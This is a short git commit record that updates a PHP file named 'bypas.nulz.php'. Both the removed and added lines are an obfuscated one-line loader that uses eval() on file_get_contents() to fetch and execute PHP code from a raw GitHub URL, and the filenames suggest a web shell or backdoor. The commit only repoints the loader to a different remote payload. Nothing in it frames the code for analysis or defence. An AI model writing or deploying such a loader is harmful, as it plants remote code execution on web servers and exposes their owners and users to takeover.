aa2cafe4828f971cbe3b29bf8039655b2725f23d
zivanaoktora <142502775+zivanaoktora@users.noreply.github.com>
2024-07-04 12:24:41 +0700

    Update bypas.nulz.php

--- bypas.nulz.php
+++ bypas.nulz.php
@@ -1,1 +1,1 @@
-<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/alfabepas.php"))/******/ /*By Me*/?>
+<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/lock-geek.php.php"))/******/ /*By Me*/?>
